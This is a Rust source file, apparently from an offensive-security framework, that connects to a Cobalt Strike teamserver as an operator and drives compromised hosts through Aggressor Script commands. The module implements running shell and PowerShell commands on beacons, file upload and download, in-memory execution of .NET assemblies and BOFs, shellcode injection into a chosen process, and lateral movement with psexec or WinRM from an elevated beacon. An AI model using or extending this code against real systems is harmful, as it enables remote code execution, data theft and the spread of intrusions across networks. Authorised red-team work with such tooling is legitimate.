//! Cobalt Strike integration via Aggressor Script over TCP socket.
//!
//! Connects to a Cobalt Strike teamserver as an operator using the
//! teamserver management port (default 50050). Commands are sent as
//! Aggressor Script snippets using a 4-byte length-prefixed protocol.
//!
//! All trait methods use interior `Mutex`-based mutability so that the
//! `&self` `C2Channel` trait methods can issue commands over the shared
//! TCP stream.

use super::{
    C2Auth, C2Channel, C2Config, C2Framework, C2Listener, C2Session, C2TaskResult, ImplantRequest,
    SessionType,
};
use crate::error::{OverthroneError, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Mutex;

/// Cobalt Strike teamserver connection.
///
/// Uses `Arc<Mutex<...>>` for shared TCP stream access so that all
/// `C2Channel` trait methods (which take `&self`) can send commands.
pub struct CobaltStrikeChannel {
    /// TCP connection to teamserver (mutex for interior mutability)
    stream: Arc<Mutex<Option<TcpStream>>>,
    /// Connected state
    connected: Arc<std::sync::atomic::AtomicBool>,
    /// Cached beacon list
    beacons: Arc<Mutex<Vec<CsBeacon>>>,
    /// Teamserver metadata
    server_info: Arc<Mutex<HashMap<String, String>>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CsBeacon {
    id: String,
    internal_ip: String,
    external_ip: String,
    user: String,
    computer: String,
    os: String,
    process: String,
    pid: u32,
    arch: String,
    is_admin: bool,
    last: String,
    sleep: u32,
    jitter: u32,
    listener: String,
}

impl Default for CobaltStrikeChannel {
    fn default() -> Self {
        Self::new()
    }
}

impl CobaltStrikeChannel {
    pub fn new() -> Self {
        Self {
            stream: Arc::new(Mutex::new(None)),
            connected: Arc::new(std::sync::atomic::AtomicBool::new(false)),
            beacons: Arc::new(Mutex::new(Vec::new())),
            server_info: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Send a raw Aggressor Script command to the teamserver and read the response.
    ///
    /// Protocol: 4-byte big-endian length prefix + UTF-8 command data.
    /// Response: 4-byte big-endian length prefix + UTF-8 response data.
    async fn send_aggressor(&self, command: &str) -> Result<String> {
        let mut guard = self.stream.lock().await;
        let stream = guard
            .as_mut()
            .ok_or_else(|| OverthroneError::C2("Not connected to Cobalt Strike".into()))?;

        // Write: length(4) + data
        let data = command.as_bytes();
        let len = (data.len() as u32).to_be_bytes();
        stream
            .write_all(&len)
            .await
            .map_err(|e| OverthroneError::C2(format!("Write error: {e}")))?;
        stream
            .write_all(data)
            .await
            .map_err(|e| OverthroneError::C2(format!("Write error: {e}")))?;
        stream
            .flush()
            .await
            .map_err(|e| OverthroneError::C2(format!("Flush error: {e}")))?;

        // Read: length(4) + data
        let mut len_buf = [0u8; 4];
        stream
            .read_exact(&mut len_buf)
            .await
            .map_err(|e| OverthroneError::C2(format!("Read error: {e}")))?;
        let resp_len = u32::from_be_bytes(len_buf) as usize;

        if resp_len > 10 * 1024 * 1024 {
            return Err(OverthroneError::C2(format!(
                "Response too large: {resp_len} bytes"
            )));
        }

        let mut resp_buf = vec![0u8; resp_len];
        stream
            .read_exact(&mut resp_buf)
            .await
            .map_err(|e| OverthroneError::C2(format!("Read error: {e}")))?;

        String::from_utf8(resp_buf)
            .map_err(|e| OverthroneError::C2(format!("Invalid UTF-8 response: {e}")))
    }

    /// Task a beacon and poll for results.
    ///
    /// Sends an Aggressor command, then polls `bdata()` every 2 seconds
    /// until output is available or the timeout (5 min) is exceeded.
    async fn task_beacon(&self, beacon_id: &str, aggressor_cmd: &str) -> Result<C2TaskResult> {
        let task_id = format!("cs-{}", uuid::Uuid::new_v4().as_simple());

        // Send the task
        let _ack = self.send_aggressor(aggressor_cmd).await?;

        // Poll for output
        let start = std::time::Instant::now();
        let timeout = Duration::from_secs(300);

        loop {
            if start.elapsed() > timeout {
                return Ok(C2TaskResult {
                    task_id,
                    success: false,
                    output: String::new(),
                    error: "Timeout waiting for beacon callback".into(),
                    raw_data: None,
                    duration: start.elapsed(),
                });
            }

            let check_cmd = format!("bdata('{}');", Self::escape(beacon_id));
            let result = self.send_aggressor(&check_cmd).await?;

            if !result.is_empty() && result != "null" && result != "\"\"" {
                return Ok(C2TaskResult {
                    task_id,
                    success: true,
                    output: result,
                    error: String::new(),
                    raw_data: None,
                    duration: start.elapsed(),
                });
            }

            tokio::time::sleep(Duration::from_secs(2)).await;
        }
    }

    /// Refresh the cached beacon list from the teamserver.
    async fn refresh_beacons(&self) -> Result<()> {
        let resp = self.send_aggressor("beacons()").await?;
        if let Ok(parsed) = serde_json::from_str::<Vec<CsBeacon>>(&resp) {
            let mut beacons = self.beacons.lock().await;
            *beacons = parsed;
        } else {
            log::debug!(
                "[c2:cs] Could not parse beacon list: {}",
                &resp[..resp.len().min(200)]
            );
        }
        Ok(())
    }

    /// Escape single quotes for Aggressor Script string literals.
    fn escape(s: &str) -> String {
        s.replace('\\', "\\\\").replace('\'', "\\'")
    }
}

#[async_trait]
impl C2Channel for CobaltStrikeChannel {
    fn framework(&self) -> C2Framework {
        C2Framework::CobaltStrike
    }

    async fn connect(&mut self, config: &C2Config) -> Result<()> {
        let addr = format!("{}:{}", config.host, config.port);
        log::info!("[c2:cs] Connecting to Cobalt Strike at {addr}");

        let stream = tokio::time::timeout(config.timeout, TcpStream::connect(&addr))
            .await
            .map_err(|_| OverthroneError::C2(format!("Connection timeout to {addr}")))?
            .map_err(|e| OverthroneError::C2(format!("Connection failed to {addr}: {e}")))?;

        *self.stream.lock().await = Some(stream);

        // Authenticate
        let password = match &config.auth {
            C2Auth::Password { password } => password.clone(),
            _ => {
                return Err(OverthroneError::C2(
                    "Cobalt Strike requires password authentication".into(),
                ));
            }
        };

        let auth_cmd = format!("auth('{}')", Self::escape(&password));
        let auth_result = self.send_aggressor(&auth_cmd).await?;

        if auth_result.contains("error") || auth_result.contains("denied") {
            return Err(OverthroneError::C2(format!(
                "Authentication failed: {auth_result}"
            )));
        }

        self.connected
            .store(true, std::sync::atomic::Ordering::SeqCst);
        log::info!("[c2:cs] Authenticated to Cobalt Strike teamserver");

        // Cache server info
        let version = self.send_aggressor("version()").await.unwrap_or_default();
        {
            let mut info = self.server_info.lock().await;
            info.insert("version".into(), version);
        }

        // Initial beacon refresh
        let _ = self.refresh_beacons().await;

        Ok(())
    }

    async fn disconnect(&mut self) -> Result<()> {
        let mut guard = self.stream.lock().await;
        if let Some(mut stream) = guard.take() {
            let _ = stream.shutdown().await;
        }
        self.connected
            .store(false, std::sync::atomic::Ordering::SeqCst);
        log::info!("[c2:cs] Disconnected from Cobalt Strike");
        Ok(())
    }

    fn is_connected(&self) -> bool {
        self.connected.load(std::sync::atomic::Ordering::SeqCst)
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        // Refresh beacon cache
        let _ = self.refresh_beacons().await;

        let beacons = self.beacons.lock().await;
        let sessions = beacons
            .iter()
            .map(|b| C2Session {
                id: b.id.clone(),
                hostname: b.computer.clone(),
                ip: b.internal_ip.clone(),
                username: b.user.clone(),
                domain: b.user.split('\\').next().unwrap_or("").to_string(),
                process: b.process.clone(),
                pid: b.pid,
                arch: b.arch.clone(),
                os: b.os.clone(),
                elevated: b.is_admin,
                session_type: SessionType::Beacon,
                last_seen: b.last.clone(),
                sleep_interval: Some(Duration::from_secs(b.sleep as u64)),
                metadata: {
                    let mut m = HashMap::new();
                    m.insert("listener".into(), b.listener.clone());
                    m.insert("jitter".into(), b.jitter.to_string());
                    m
                },
            })
            .collect();

        Ok(sessions)
    }

    async fn get_session(&self, session_id: &str) -> Result<C2Session> {
        self.list_sessions()
            .await?
            .into_iter()
            .find(|s| s.id == session_id)
            .ok_or_else(|| OverthroneError::C2(format!("Beacon {session_id} not found")))
    }

    async fn exec_command(&self, session_id: &str, command: &str) -> Result<C2TaskResult> {
        let cmd = format!(
            "bshell('{}', '{}');",
            Self::escape(session_id),
            Self::escape(command)
        );
        self.task_beacon(session_id, &cmd).await
    }

    async fn exec_powershell(&self, session_id: &str, script: &str) -> Result<C2TaskResult> {
        let cmd = format!(
            "bpowershell('{}', '{}');",
            Self::escape(session_id),
            Self::escape(script)
        );
        self.task_beacon(session_id, &cmd).await
    }

    async fn upload_file(
        &self,
        session_id: &str,
        local_data: &[u8],
        remote_path: &str,
    ) -> Result<C2TaskResult> {
        // Write data to a temp file, then use bupload
        let temp_path = std::env::temp_dir().join(format!("ovt_upload_{}", uuid::Uuid::new_v4()));
        std::fs::write(&temp_path, local_data)
            .map_err(|e| OverthroneError::C2(format!("Temp file write error: {e}")))?;

        let cmd = format!(
            "bupload('{}', '{}');",
            Self::escape(session_id),
            Self::escape(&temp_path.to_string_lossy())
        );
        let result = self.task_beacon(session_id, &cmd).await;

        // Clean up temp file
        let _ = std::fs::remove_file(&temp_path);

        // If remote_path differs, move the file on target
        if !remote_path.is_empty() {
            let move_cmd = format!(
                "bshell('{}', 'move \"{}\" \"{}\"');",
                Self::escape(session_id),
                Self::escape(&temp_path.file_name().unwrap_or_default().to_string_lossy()),
                Self::escape(remote_path)
            );
            let _ = self.send_aggressor(&move_cmd).await;
        }

        result
    }

    async fn download_file(&self, session_id: &str, remote_path: &str) -> Result<C2TaskResult> {
        let cmd = format!(
            "bdownload('{}', '{}');",
            Self::escape(session_id),
            Self::escape(remote_path)
        );
        self.task_beacon(session_id, &cmd).await
    }

    async fn execute_assembly(
        &self,
        session_id: &str,
        assembly_data: &[u8],
        args: &str,
    ) -> Result<C2TaskResult> {
        // Write assembly to temp file
        let temp_path = std::env::temp_dir().join(format!("ovt_asm_{}.exe", uuid::Uuid::new_v4()));
        std::fs::write(&temp_path, assembly_data)
            .map_err(|e| OverthroneError::C2(format!("Temp file write error: {e}")))?;

        let cmd = format!(
            "bexecute_assembly('{}', '{}', '{}');",
            Self::escape(session_id),
            Self::escape(&temp_path.to_string_lossy()),
            Self::escape(args)
        );
        let result = self.task_beacon(session_id, &cmd).await;

        let _ = std::fs::remove_file(&temp_path);
        result
    }

    async fn execute_bof(
        &self,
        session_id: &str,
        bof_data: &[u8],
        args: &[u8],
    ) -> Result<C2TaskResult> {
        // Write BOF to temp file
        let temp_path = std::env::temp_dir().join(format!("ovt_bof_{}.o", uuid::Uuid::new_v4()));
        std::fs::write(&temp_path, bof_data)
            .map_err(|e| OverthroneError::C2(format!("Temp BOF write error: {e}")))?;

        let args_hex = hex::encode(args);
        let cmd = format!(
            "binline_execute('{}', '{}', '{}');",
            Self::escape(session_id),
            Self::escape(&temp_path.to_string_lossy()),
            args_hex
        );
        let result = self.task_beacon(session_id, &cmd).await;

        let _ = std::fs::remove_file(&temp_path);
        result
    }

    async fn shellcode_inject(
        &self,
        session_id: &str,
        shellcode: &[u8],
        target_pid: u32,
    ) -> Result<C2TaskResult> {
        // Write shellcode to temp file
        let temp_path = std::env::temp_dir().join(format!("ovt_sc_{}.bin", uuid::Uuid::new_v4()));
        std::fs::write(&temp_path, shellcode)
            .map_err(|e| OverthroneError::C2(format!("Temp shellcode write error: {e}")))?;

        let cmd = format!(
            "bshinject('{}', {}, '{}');",
            Self::escape(session_id),
            target_pid,
            Self::escape(&temp_path.to_string_lossy())
        );
        let result = self.task_beacon(session_id, &cmd).await;

        let _ = std::fs::remove_file(&temp_path);
        result
    }

    async fn deploy_implant(&self, request: &ImplantRequest) -> Result<C2TaskResult> {
        // Use CS jump command for lateral movement
        let method = match request.delivery_method {
            super::DeliveryMethod::SmbDrop => "psexec",
            super::DeliveryMethod::WinRM => "winrm",
            super::DeliveryMethod::FrameworkNative => "psexec_psh",
            _ => "psexec",
        };

        // Find an existing elevated beacon to pivot from
        let beacons = self.beacons.lock().await;
        let pivot_beacon = beacons.iter().find(|b| b.is_admin).ok_or_else(|| {
            OverthroneError::C2("No elevated beacon available for lateral movement".into())
        })?;
        let pivot_id = pivot_beacon.id.clone();
        drop(beacons);

        let cmd = format!(
            "bjump('{}', '{}', '{}', '{}');",
            Self::escape(&pivot_id),
            method,
            Self::escape(&request.target),
            Self::escape(&request.listener)
        );
        self.task_beacon(&pivot_id, &cmd).await
    }

    async fn list_listeners(&self) -> Result<Vec<C2Listener>> {
        let resp = self.send_aggressor("listeners()").await?;

        let mut listeners = Vec::new();
        // CS returns a Sleep array of listener names
        // Parse and enrich each listener
        if let Ok(names) = serde_json::from_str::<Vec<String>>(&resp) {
            for name in names {
                let info_cmd = format!("listener_info('{}');", Self::escape(&name));
                let info_resp = self.send_aggressor(&info_cmd).await.unwrap_or_default();

                let parsed: serde_json::Value =
                    serde_json::from_str(&info_resp).unwrap_or_default();

                listeners.push(C2Listener {
                    name: name.clone(),
                    listener_type: parsed["payload"].as_str().unwrap_or("unknown").to_string(),
                    host: parsed["host"].as_str().unwrap_or("").to_string(),
                    port: parsed["port"].as_u64().unwrap_or(0) as u16,
                    active: true,
                });
            }
        }

        Ok(listeners)
    }

    async fn server_info(&self) -> Result<HashMap<String, String>> {
        Ok(self.server_info.lock().await.clone())
    }
}
